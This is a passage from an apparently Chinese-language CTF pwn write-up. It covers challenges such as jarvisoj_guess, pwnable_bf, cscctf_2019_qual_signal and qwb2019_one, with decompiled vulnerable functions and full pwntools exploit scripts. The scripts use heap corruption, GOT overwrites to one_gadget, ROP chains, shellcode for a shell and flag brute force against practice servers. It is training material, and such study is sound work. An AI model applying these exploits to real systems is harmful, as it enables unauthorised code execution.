r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'dddd'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, <span class="string">b'\x80'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">'\x40'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">heap_ptr = <span class="number">0x601040</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(heap_ptr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x60</span>, p64(heap_ptr))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(heap_ptr))</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x60</span>, shellcode + p64(<span class="number">0</span>) + <span class="string">b'\x30'</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">8</span>, p64(heap_ptr))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Size: '</span>, <span class="built_in">str</span>(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="jarvisoj-guess"><a href="#jarvisoj-guess" class="headerlink" title="jarvisoj_guess"></a>jarvisoj_guess</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">is_flag_correct</span><span class="params">(<span class="type">char</span> *flag_hex)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> given_flag[<span class="number">50</span>]; <span class="comment">// [rsp+10h] [rbp-190h] BYREF</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">50</span>]; <span class="comment">// [rsp+50h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="type">char</span> bin_by_hex[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> value2; <span class="comment">// [rsp+192h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">char</span> value1; <span class="comment">// [rsp+193h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+194h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> diff; <span class="comment">// [rsp+19Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag_hex) != <span class="number">100</span> )</span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(flag_hex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bad input, that hexstring should be 100 chars, but was %d chars long!\n"</span>, v1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  qmemcpy(bin_by_hex, &amp;unk_401100, <span class="keyword">sizeof</span>(bin_by_hex));</span><br><span class="line">  qmemcpy(flag, <span class="string">"FAKE{9b355e394d2070ebd0df195d8b234509cc29272bc412}"</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  bzero(given_flag, <span class="number">0x32</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    value1 = bin_by_hex[flag_hex[<span class="number">2</span> * i]];</span><br><span class="line">    value2 = bin_by_hex[flag_hex[<span class="number">2</span> * i + <span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">if</span> ( value1 == <span class="number">-1</span> || value2 == <span class="number">-1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"bad input – one of the characters you supplied was not a valid hex character!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    given_flag[i] = value2 | (<span class="number">16</span> * value1);</span><br><span class="line">  }</span><br><span class="line">  diff = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">49</span>; ++index )</span><br><span class="line">    diff |= flag[index] ^ given_flag[index];</span><br><span class="line">  <span class="keyword">return</span> diff == <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这一题需要获得远程的flag，本地用ida打开之后是FAKE这个flag，远程的flag不一样</p>
<p>这题的意思就是输入正确的flag（格式是flag的16进制数），在本地测的时候输入<code>46414b457b39623335356533393464323037306562643064663139356438623233343530396363323932373262633431327d</code>这个即可正确</p>
<p>格式是由<code>given_flag[i] = value2 | (16 * value1);</code>这个控制，如果value1和value2正常的话是这样的，F的16进制是46，value1就是4，value2就是6，<code>4 * 16 | 6 = 70</code>，F的10进制是70，所以最后<code>flag[index] ^ given_flag[index];</code>就相等正确</p>
<p>但是远程不知道flag，仔细看一下程序就可以发现<code>value1 = bin_by_hex[flag_hex[2 * i]];</code>这个地方的index是char类型，如果flag_hex里的东西超过127会发生oob，而bin_by_hex上面就是flag，所以可以将given_flag给变成flag</p>
<p>当value1为0的时候，只需要value2大于192即可使得<code>flag[index] ^ given_flag[index];</code>正确，这样子的话我们就伪造了一个不是flag但却正确的数据，那我们只需要依次改里面的一个字节来爆破出远程正确的flag</p>
<p>此时我们单字节爆破即可爆破出flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64', os='linux', log_level='debug')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./guess'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25800</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p1 += <span class="string">'0'</span> + <span class="built_in">chr</span>(<span class="number">192</span> + i)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'guess&gt; '</span>, p1)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag : flag'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        p2 = p1[<span class="number">0</span>:i * <span class="number">2</span> - <span class="number">2</span>] + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] + p1[i * <span class="number">2</span>:]</span><br><span class="line">        r.sendlineafter(<span class="string">'guess&gt; '</span>, p2)</span><br><span class="line">        result = r.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'Yaaaay'</span> <span class="keyword">in</span> result:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            li(<span class="built_in">str</span>(flag))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">li(<span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">do_brainfuck</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  result = a1 - <span class="number">43</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      ++*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">      v2 = (_BYTE *)p;</span><br><span class="line">      result = getchar();</span><br><span class="line">      *v2 = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      --*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'.'</span>:</span><br><span class="line">      result = <span class="built_in">putchar</span>(*(<span class="type">char</span> *)p);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">      result = --p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">      result = ++p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"[ and ] not supported."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>第三次做brainfuck了，oob，没有开got保护，直接打got表，先泄露出libc，然后打memset为ogg，然后控制putchar的got为main_addr，这样最后.的时候再次运行程序，会调用memset来getshell</p>
<p>打.fini发现会失败，也不知道是什么情况，所以就打memset了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./bf'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27311</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p1 = b'&lt;' * (93 + 4)</span></span><br><span class="line"><span class="string">p1 += b',' * 4</span></span><br><span class="line"><span class="string">p1 += b'['</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'.'</span> + <span class="string">b'&lt;'</span> * <span class="number">0x70</span></span><br><span class="line">p1 += <span class="string">b'.&gt;.&gt;.&gt;.&gt;'</span></span><br><span class="line">p1 += <span class="string">b'&lt;'</span> * (<span class="number">4</span> + <span class="number">4</span>)</span><br><span class="line">p1 += <span class="string">b',&gt;,&gt;,&gt;,&gt;'</span></span><br><span class="line">p1 += <span class="string">b',&gt;,&gt;,&gt;,&gt;.'</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'type some brainfuck instructions except [ ]'</span>, p1)</span><br><span class="line"></span><br><span class="line">putchar_addr = u32(r.recvuntil(<span class="string">'\xf7'</span>)[-<span class="number">4</span>:])</span><br><span class="line">li(<span class="string">'putchar_addr = '</span> + <span class="built_in">hex</span>(putchar_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc-2.23.so'</span>)</span><br><span class="line">libc_base = putchar_addr - libc.sym[<span class="string">'putchar'</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">gets_addr = libc_base + libc.sym[<span class="string">'gets'</span>]</span><br><span class="line">li(<span class="string">'gets_addr = '</span> + <span class="built_in">hex</span>(gets_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]</span></span><br><span class="line">one = [<span class="number">0x3a80c</span>, <span class="number">0x3a80e</span>, <span class="number">0x3a812</span>, <span class="number">0x3a819</span>, <span class="number">0x5f065</span>, <span class="number">0x5f066</span>]</span><br><span class="line">one_gadget = one[<span class="number">2</span>] + libc_base</span><br><span class="line">main_addr = <span class="number">0x8048671</span></span><br><span class="line"></span><br><span class="line">r.send(p32(one_gadget))</span><br><span class="line"></span><br><span class="line">r.send(p32(main_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="cscctf-2019-qual-signal"><a href="#cscctf-2019-qual-signal" class="headerlink" title="cscctf_2019_qual_signal"></a>cscctf_2019_qual_signal</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个题有意思，学到了</p>
<p>只有一个read，所以正常ret2libc不行，有一个gadget是<code>add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code>这样的，如果控制了rbx和rbp那我们就可以在任意地址中写值，那么控制rbp和rbx就在csu那里，而且可以控制r12和r14为0，符合一个gadget的条件</p>
<p>这一题把rbp改成read_got + 0x3d，这样的话执行了magic_gadget之后read_got = rbx + read_got，算一下read_got到one_gadget的距离，然后直接把rbx改成那个值，这样read_got就会被改成one_gadget，最后触发read_plt即可触发one_gadget</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./cscctf_2019_qual_signal'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28359</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">magic_gadget = <span class="number">0x0000000000400618</span></span><br><span class="line"></span><br><span class="line">csu_gadget = <span class="number">0x40074A</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:000000000040074A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040074B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040074C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040074E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400750 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400752 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400754 C3                            retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">one = <span class="number">0xe569f</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x100</span> + <span class="number">8</span>)</span><br><span class="line">p1 += p64(csu_gadget)</span><br><span class="line">p1 += p64(<span class="number">0xfffffffffffd562f</span>) <span class="comment">#rbx</span></span><br><span class="line">p1 += p64(read_got + <span class="number">0x3d</span>) <span class="comment">#rbp</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">p1 += p64(magic_gadget)</span><br><span class="line">p1 += p64(read_plt)</span><br><span class="line">r.send(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="qwb2019-one"><a href="#qwb2019-one" class="headerlink" title="qwb2019_one"></a>qwb2019_one</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">2</span>]; <span class="comment">// [rsp+16h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please give me the index of the string:"</span>);</span><br><span class="line">  index = read_input(<span class="string">"Please give me the index of the string:"</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)index &lt;= <span class="number">0x13</span> &amp;&amp; *((_QWORD *)heap_ptr + index) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Which char do you want to edit:"</span>);</span><br><span class="line">    sub_D34(v5, <span class="number">2LL</span>);</span><br><span class="line">    v4 = <span class="built_in">strchr</span>(*((<span class="type">const</span> <span class="type">char</span> **)heap_ptr + index), v5[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"What do you want to edit it into:"</span>);</span><br><span class="line">      *v4 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Sorry, I can't find it!"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Sorry~"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这一题出得很妙，学到了，首先是上面的strchr这个函数，这个strchr如果是字符串最后一个\x00也是可以被替换的，那么就可以进行堆溢出了</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">bd</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span 